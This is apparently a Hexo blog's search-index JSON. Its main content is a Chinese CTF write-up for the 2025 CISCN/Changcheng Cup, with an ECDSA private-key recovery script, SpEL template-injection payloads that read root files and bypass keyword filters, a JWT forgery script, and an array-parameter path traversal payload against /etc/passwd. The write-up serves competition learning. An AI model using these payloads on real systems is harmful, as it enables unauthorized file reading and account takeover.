[{"title":"【工具合集 | BurpSuite】BurpSuite的安装与使用","url":"/posts/aefb/","content":"","categories":["工具篇"],"tags":["工具合集","BurpSuite"]},{"title":"Hello World","url":"/posts/3eeb/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"【学习篇 | PHP专栏】php语言基础","url":"/posts/8d10/","content":"","categories":["学习篇","PHP专栏"],"tags":["学习篇","PHP基础"]},{"title":"【 比赛篇 | CTF 】2025CISCN暨长城杯","url":"/posts/bb60/","content":"ECDSA\n题目内容：\nECDSA一定是安全的吗？提交格式：flag{私钥的MD5值}\n\n题目：\n#!/usr/bin/env python3from ecdsa import SigningKey, NIST521pfrom hashlib import sha512from Crypto.Util.number import long_to_bytesimport randomimport binasciiimport sysdigest_int = int.from_bytes(sha512(b&quot;Welcome to this challenge!&quot;).digest(), &quot;big&quot;)curve_order = NIST521p.orderpriv_int = digest_int % curve_orderpriv_bytes = long_to_bytes(priv_int, 66)sk = SigningKey.from_string(priv_bytes, curve=NIST521p)vk = sk.verifying_keyf_pub = open(&quot;public.pem&quot;, &quot;wb&quot;)f_pub.write(vk.to_pem())f_pub.close()def nonce(i):    seed = sha512(b&quot;bias&quot; + bytes([i])).digest()    k = int.from_bytes(seed, &quot;big&quot;)    return kmsgs = [b&quot;message-&quot; + bytes([i]) for i in range(60)]sigs = []for i, msg in enumerate(msgs):    k = nonce(i)    sig = sk.sign(msg, k=k)    sigs.append((binascii.hexlify(msg).decode(), binascii.hexlify(sig).decode()))f_sig = open(&quot;signatures.txt&quot;, &quot;w&quot;)for m, s in sigs:    f_sig.write(&quot;%s:%s\\n&quot; % (m, s))f_sig.close()\n\n审计发现，本题考查ECDSA恢复私钥\nECDSA标准加密流程：\n\n计算消息哈希\n\n$$e &#x3D; H(m)$$\n\n选择随机 nonce k\n\n计算\n\n\n$$r &#x3D; (kG)_x \\bmod n$$\n\n计算\n\n$$s &#x3D; k^{-1}(e + dr) \\bmod n$$\n可以反推私钥d的算法：$$\\boxed{d \\equiv (sk - e) \\cdot r^{-1} \\pmod n}$$考点在nonce是假的随机数，\ndef nonce(i):    seed = sha512(b&quot;bias&quot; + bytes([i])).digest()    k = int.from_bytes(seed, &quot;big&quot;)    return k\n\n每条消息对应的nonce可预测，所以私钥可以从任意一条签名中直接被恢复。\nexp:\n#!/usr/bin/env python3import binasciifrom ecdsa import VerifyingKey, NIST521p, SigningKeyfrom hashlib import sha512, md5from binascii import hexlifydef computer_priv_from_seed():    digest = sha512(b&quot;Welcome to this challenge!&quot;).digest()    curve_order = NIST521p.order    priv_int = int.from_bytes(digest, &quot;big&quot;) % curve_order    priv_bytes = priv_int.to_bytes(66, &quot;big&quot;)    return priv_int,priv_bytes, digestdef nonce(i):    seed = sha512(b&quot;bias&quot; + bytes([i])).digest()    k = int.from_bytes(seed, &quot;big&quot;)    return kdef recover_d_from_signature(msg_bytes, sig_hex):    sig = binascii.unhexlify(sig_hex)    if len(sig) &lt; 132:        raise ValueError(&quot;Signature length is too short to be valid for NIST521p&quot;)    r = int.from_bytes(sig[0:66], &quot;big&quot;)    s = int.from_bytes(sig[66:132], &quot;big&quot;)    n = int(NIST521p.order)    e = int.from_bytes(sha512(msg_bytes).digest(), &quot;big&quot;)    if len(msg_bytes) == 0 or msg_bytes[-1] &gt; 255:        raise ValueError(&quot;Invalid message format&quot;)    i = msg_bytes[-1]    k = nonce(i)    d = ((s * k - e) * pow(r, -1, n)) % n    priv_bytes = d.to_bytes(66, &quot;big&quot;)    return d, priv_bytes, idef main():    priv_int, priv_bytes, digest = computer_priv_from_seed()    print(&quot;Welcome to this challenge! private key (int):&quot;, hexlify(digest).decode())    print(&quot;Private key (int):&quot;, priv_int)    print(&quot;Private key (hex):&quot;, priv_bytes.hex())    print(&quot;MD5 of private key:&quot;, md5(priv_bytes).hexdigest())    recovered =  set()    with open(&quot;signatures.txt&quot;, &quot;r&quot;) as f:        lines = [ln.strip() for ln in f if ln.strip() and &quot;:&quot; in ln]            for ln in lines:        print(&quot;=============================================&quot;)        print(&quot;Processing line:&quot;, ln)        left, right = ln.split(&quot;:&quot;, 1)        msg_bytes = bytes.fromhex(left)        sig_hex = right.strip()        d, pd, i = recover_d_from_signature(msg_bytes, sig_hex)        print(&quot;Recovered private key (hex):&quot;, pd.hex())        print(&quot;MD5 of recovered private key:&quot;, md5(pd).hexdigest())        recovered.add(pd.hex())        with open(&quot;public.pem&quot;, &quot;rb&quot;) as f:            pub_pem = f.read()                    sk = SigningKey.from_string(priv_bytes, curve=NIST521p)        vk = sk.verifying_key        pem = vk.to_pem()        print(&quot;+++++++++++++++++++++++++++++++++++++++++++++&quot;)        if pub_pem.strip() == pem.strip():            print(&quot;Public key from recovered private key does not match original!&quot;)        print(&quot;Public key from recovered private key matches original:&quot;, pem.decode())        print(md5(priv_bytes))        print(priv_bytes)        print(&quot;=============================================&quot;)        priv_str = str(priv_int).encode(&quot;ascii&quot;)        print(&quot;Private key as string:&quot;, md5(priv_str).hexdigest())if __name__ == &quot;__main__&quot;:    main()\n\n确保验证时得出的公钥与题目给的一致：\n\nEzJava\n题目内容：\n公告管理系统近期开发测试，为保证测试环境安全，已把常用系统命令全部清除，请尝试读取根目录的敏感文件。（本题下发后，请通过http访问相应的ip和port，例如 nc ip port ，改为http://ip:port/ ）\n\nadmin/admin123弱口令直接进后台，发现为java的模板渲染，且T(连接起来会替换为NONO,new被替换为WoW。\n最后使用java中的File类的listFiles方法获取根目录下的文件列表，因为其返回结果为数组，需要转换为字符串，所以构造：\n$&#123;T (java.util.Arrays).toString(T (java.io.File).listRoots()[0].listFiles().![name])&#125;\n\n\n继续使用Files类中的readAiiLines方法获取flag值，Paths类的get设定文件名，因为程序会将flag字符串替换为空，所以使用concat进行截断绕过：\n$&#123;T (java.nio.file.Files).readAllLines(T (java.nio.file.Paths).get(&#x27;/&#x27;.concat(&#x27;f&#x27;).concat(&#x27;lag_y0u_d0nt_kn0w&#x27;)))&#125;\n\n\nDeprecated今年长城杯决赛原题： 2025 长城杯 final 记录\n下载附件后审计，漏洞点有两个：\nrouter.get(&#x27;/checkfile&#x27;, AuthMiddleware, async (req, res, next) =&gt; &#123;    try&#123;        let user = await db.getUser(req.data.username);        if (user === undefined) &#123;            return res.send(`user $&#123;req.data.username&#125; doesn&#x27;t exist.`);        &#125;        if (req.data.username === &#x27;admin&#x27; &amp;&amp; req.data.priviledge===&#x27;File-Priviledged-User&#x27;)&#123;            let file=req.query.file;            if (!file) &#123;                return res.send(&#x27;File name not specified.&#x27;);            &#125;            if (!allowedFile(file)) &#123;                return res.send(&#x27;File type not allowed.&#x27;);            &#125;            try&#123;                if (file.includes(&#x27; &#x27;) || file.includes(&#x27;/&#x27;) || file.includes(&#x27;..&#x27;)) &#123;                    return res.send(&#x27;Invalid filename!&#x27;);                &#125;            &#125;            catch(err)&#123;                return res.send(&#x27;An error occured!&#x27;);            &#125;            if (file.length &gt; 10) &#123;                file = file.slice(0, 10);            &#125;            const returned = path.resolve(&#x27;./&#x27; + file);            fs.readFile(returned, (err) =&gt; &#123;                if (err) &#123;                    return res.send(&#x27;An error occured!&#x27;);                &#125;                res.sendFile(returned);            &#125;);        &#125;        else&#123;            return res.send(&#x27;Sorry Only priviledged Admin can check the file.&#x27;).status(403);        &#125;    &#125;catch (err)&#123;        return next(err);    &#125;&#125;);\n\ncheckfile路由存在文件读取。\nconst allowedFile = (file) =&gt; &#123;    const format = file.slice(file.indexOf(&#x27;.&#x27;) + 1);    return format == &#x27;log&#x27;;&#125;;\n\n这里可以绕过扩展名：\n\n这里可以打文件读取：\nconst returned = path.resolve(&#x27;./&#x27; + file);\n\n看下效果：\n然后res.sendFile(returned);程序就会获取服务器上存在的文件，发送到客户端。\n这个基本就是获取flag的核心所在，剩下继续看：先看第一层过滤：\nlet user = await db.getUser(req.data.username);        if (user === undefined) &#123;            return res.send(`user $&#123;req.data.username&#125; doesn&#x27;t exist.`);        &#125;        if (req.data.username === &#x27;admin&#x27; &amp;&amp; req.data.priviledge===&#x27;File-Priviledged-User&#x27;)&#123;\n\n这里需要伪造jwt，并且jwt的值需要等于这两个。\n首先注册两个用户，获取两个用户的jwt：\n使用rsa_sign2n&#x2F;standalone at release · silentsignal&#x2F;rsa_sign2n爆破公钥，爆破到公钥之后，利用python生成相应的jwt：\nfrom pathlib import Pathimport jwtimport pickleimport base64import encodingspath = Path(&#x27;.&#x27;)for file in path.glob(&#x27;*.pem&#x27;):    with open(file.name, &#x27;rb&#x27;) as key:        token=jwt.encode(            payload=&#123;                &quot;username&quot;: &quot;admin&quot;,                &quot;priviledge&quot;: &quot;File-Priviledged-User&quot;,                &quot;iat&quot;: 1766911284,            &#125;,            key=key.read(),            algorithm=&#x27;HS256&#x27;        )        print(token)        print(&quot;---&quot;)\n\n参考https://www.caterpie771.cn/archives/347#GeekChalleng2024_jwt_pickle\n这个时候就获得了admin用户的jwt。接下来绕过：\nif (file.includes(&#x27; &#x27;) || file.includes(&#x27;/&#x27;) || file.includes(&#x27;..&#x27;))\n\n这里只需要传入数组就可以被绕过。\n写一个最小demo：\nconst express = require(&#x27;express&#x27;);const fs = require(&#x27;fs&#x27;);const &#123; type &#125; = require(&#x27;os&#x27;);const path = require(&#x27;path&#x27;);const app = express();const allowedFile = (file) =&gt; &#123;    const format = file.slice(file.indexOf(&#x27;.&#x27;) + 1);    return format == &#x27;log&#x27;;&#125;;app.get(&#x27;/read&#x27;, (req, res, next) =&gt; &#123;    let file = req.query[&#x27;file[]&#x27;];   // 让其接收file[]达到效果 ← 浏览器 ?file=xxx.log    console.log(&#x27;[+] req.query:&#x27;, req.query);    console.log(&#x27;[+] req.query.file:&#x27;, req.query.file);    if (!file) &#123;        return res.send(&#x27;File name not specified.&#x27;);    &#125;    if (!allowedFile(file)) &#123;        return res.send(&#x27;File type not allowed.&#x27;);    &#125;    try &#123;        if (file.includes(&#x27; &#x27;) || file.includes(&#x27;/&#x27;) || file.includes(&#x27;..&#x27;)) &#123;            return res.send(&#x27;Invalid filename!&#x27;);        &#125;    &#125; catch (err) &#123;        return res.send(&#x27;An error occured!&#x27;);    &#125;    if (file.length &gt; 10) &#123;        file = file.slice(0, 10);    &#125;    const returned = path.resolve(&#x27;./&#x27; + file);    console.log(&#x27;[+] resolved path:&#x27;, returned);    fs.readFile(returned, (err) =&gt; &#123;        if (err) &#123;            return res.send(&#x27;An error occured!&#x27;);        &#125;        res.sendFile(returned);    &#125;);&#125;);app.listen(3000, () =&gt; &#123;    console.log(&#x27;Listening on http://localhost:3000&#x27;);&#125;);\n\n由于本地原因，漏洞点体现的不明显，当我们传入数组类型时：\nhttp://localhost:3000/read?file[]=&amp;file[]=&amp;file[]=&amp;file[]=../../../../../etc/passwd&amp;file[]=.&amp;file[]=log\n\n后端传入：\n\n设置file为传入的内容：\nconst allowedFile = (file) =&gt; &#123;    const format = file.slice(file.indexOf(&#x27;.&#x27;) + 1);    return format == &#x27;log&#x27;;&#125;;const path = require(&#x27;path&#x27;);// === 漏洞 payload（攻击者可控）===let file = [ &#x27;&#x27;,  &#x27;&#x27;,  &#x27;&#x27;,  &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;../../../../../../../../etc/passwd&#x27;, &#x27;.&#x27;, &#x27;log&#x27; ];console.log(&#x27;[+] file payload:&#x27;, file);// === 漏洞核心代码 ===if (!allowedFile(file)) &#123;    console.log(&#x27;File type not allowed.&#x27;);&#125; else &#123;    console.log(&#x27;[+] passed allowedFile check&#x27;);&#125;if (file.length &gt; 10) &#123;    file = file.slice(0, 10);&#125;const returned = path.resolve(&#x27;./&#x27; + file);console.log(&#x27;[+] resolved path:&#x27;, returned);\n\n通过控制传入的空数组的值以及路径穿越，就可以任意读取文件：\n","categories":["比赛篇"],"tags":["CTF比赛合集","CISCN","长城杯"]},{"title":"【工具合集 | Yakit】Yakit的安装和使用","url":"/posts/86a3/","content":"","categories":["工具篇"],"tags":["工具合集","yakit"]}]